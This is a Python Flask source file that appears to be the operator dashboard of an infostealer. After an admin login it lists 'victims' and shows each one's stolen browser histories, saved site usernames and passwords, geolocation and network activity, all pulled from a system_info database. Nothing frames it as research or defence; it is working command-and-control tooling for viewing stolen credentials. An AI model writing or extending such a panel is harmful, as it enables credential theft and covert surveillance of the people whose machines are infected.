import os
from werkzeug.utils import secure_filename
from flask import Flask, render_template, request, redirect, url_for, session, flash, send_from_directory, jsonify
import pymysql
from bcrypt import hashpw, gensalt, checkpw
from datetime import timedelta
from pymysql.cursors import DictCursor
from config import database_connection
import logging

app = Flask(__name__)
app.secret_key = os.urandom(24)

app.permanent_session_lifetime = timedelta(minutes=30)

logging.basicConfig(level=logging.DEBUG)

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
UPLOAD_FOLDER = 'static/profile_pictures'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

def get_db_connection():
    return pymysql.connect(**database_connection)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def get_victim(victim_id):
    conn = get_db_connection()
    cursor = conn.cursor(DictCursor)
    cursor.execute("SELECT id, username FROM system_info WHERE id = %s", (victim_id,))
    victim = cursor.fetchone()
    conn.close()
    return victim

@app.route('/')
def index():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        conn = get_db_connection()
        cursor = conn.cursor(DictCursor)
        cursor.execute("SELECT id, username, password FROM list_admin WHERE username = %s", (username,))
        user = cursor.fetchone()
        conn.close()

        if user and checkpw(password.encode('utf-8'), user['password'].encode('utf-8')):
            session['id'] = user['id']
            session['username'] = user['username']
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error='Username atau Password salah')
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    user_id = session.get('id')
    conn = get_db_connection()
    cursor = conn.cursor(DictCursor)
    cursor.execute("SELECT username FROM list_admin WHERE id = %s", (user_id,))
    user_data = cursor.fetchone()
    conn.close()
    return render_template('dashboard.html', user=user_data)

@app.route('/victim')
def victim():
    user_id = session.get('id')
    conn = get_db_connection()
    cursor = conn.cursor(DictCursor)
    cursor.execute("SELECT username FROM list_admin WHERE id = %s", (user_id,))
    user_data = cursor.fetchone()
    conn.close()
    return render_template('victim.html')

@app.route('/settings', methods=['GET', 'POST'])
def settings():
    user_id = session.get('id')

    if not user_id:
        return redirect(url_for('login'))

    conn = get_db_connection()
    cursor = conn.cursor(DictCursor)
    cursor.execute("SELECT username, password FROM list_admin WHERE id = %s", (user_id,))
    user_data = cursor.fetchone()

    if request.method == 'POST':
        new_password = request.form['newPassword']
        confirm_password = request.form['confirmPassword']

        if new_password != confirm_password:
            flash("Password dan konfirmasi password tidak cocok!", "error")
            return render_template('settings.html', user=user_data)

        hashed_password = hashpw(new_password.encode('utf-8'), gensalt())
        cursor.execute("UPDATE list_admin SET password = %s WHERE id = %s", (hashed_password, user_id))

        if 'profile_picture' in request.files:
            file = request.files['profile_picture']
            if file and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                file_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                file.save(file_path)
                cursor.execute("UPDATE list_admin SET profile_picture = %s WHERE id = %s", (filename, user_id))

        conn.commit()
        flash("Profile updated successfully!", "success")
        return redirect(url_for('settings'))

    conn.close()
    return render_template('settings.html', user=user_data)

@app.route('/get_victims', methods=['GET'])
def get_victims():
    conn = get_db_connection()
    cursor = conn.cursor(DictCursor)

    cursor.execute("""
        SELECT t.*
        FROM system_info t
        INNER JOIN (
            SELECT hostname, MAX(created_at) as max_time
            FROM system_info
            GROUP BY hostname
        ) grouped
        ON t.hostname = grouped.hostname AND t.created_at = grouped.max_time
    """)
    
    victims = cursor.fetchall()
    conn.close()
    return jsonify(victims)


@app.route('/overview')
def overview():
    victim_id = request.args.get('id')
    victim = get_victim(victim_id)

    conn = get_db_connection()
    cursor = conn.cursor(DictCursor)
    cursor.execute("SELECT * FROM system_info WHERE id = %s", (victim_id,))
    victim_data = cursor.fetchone()
    conn.close()

    if victim and victim_data:
        return render_template('overview.html', victim=victim_data)
    else:
        return "Victim not found", 404

@app.route('/device')
def device():
    victim_id = request.args.get('id')
    victim = get_victim(victim_id)

    conn = get_db_connection()
    cursor = conn.cursor(DictCursor)
    cursor.execute("SELECT * FROM system_info WHERE id = %s", (victim_id,))
    victim_data = cursor.fetchone()
    conn.close()

    if victim and victim_data:
        return render_template('device.html', victim=victim_data)
    else:
        return "Victim not found", 404

@app.route('/history')
def history():
    victim_id = request.args.get('id')
    victim = get_victim(victim_id)

    conn = get_db_connection()
    cursor = conn.cursor(DictCursor)
    cursor.execute("SELECT chrome_history, firefox_history, edge_history FROM system_info WHERE id = %s", (victim_id,))
    victim_history = cursor.fetchone()
    conn.close()

    if victim and victim_history:
        return render_template('history.html', victim_history=victim_history, victim=victim)
    else:
        return "Victim not found", 404

@app.route('/network')
def network():
    victim_id = request.args.get('id')

    conn = get_db_connection()
    cursor = conn.cursor(DictCursor)

    cursor.execute("SELECT * FROM system_info WHERE id = %s", (victim_id,))
    victim = cursor.fetchone()

    if not victim:
        conn.close()
        return "Victim not found", 404

    hostname = victim['hostname']

    cursor.execute("""
        SELECT packets_sent, packets_recv, created_at
        FROM system_info
        WHERE hostname = %s
        ORDER BY created_at
    """, (hostname,))
    network_data = cursor.fetchall()

    conn.close()

    return render_template('network.html', network_data=network_data, victim=victim)

@app.route('/location')
def location():
    victim_id = request.args.get('id')
    victim = get_victim(victim_id)

    conn = get_db_connection()
    cursor = conn.cursor(DictCursor)
    cursor.execute("SELECT latitude, longitude, city, region, country FROM system_info WHERE id = %s", (victim_id,))
    victim_location = cursor.fetchone()
    conn.close()

    if victim and victim_location:
        return render_template('location.html', victim_location=victim_location, victim=victim)
    else:
        return "Location not found", 404

@app.route('/passcookies')
def passcookies():
    victim_id = request.args.get('id')
    victim = get_victim(victim_id)

    conn = get_db_connection()
    cursor = conn.cursor(DictCursor)
    cursor.execute("SELECT url, usernames, passwords FROM system_info WHERE id = %s", (victim_id,))
    victim_data = cursor.fetchone()
    conn.close()

    if victim and victim_data:
        return render_template('passcookies.html', victim_data=victim_data, victim=victim)
    else:
        return "Victim not found", 404

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory(app.static_folder, filename)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')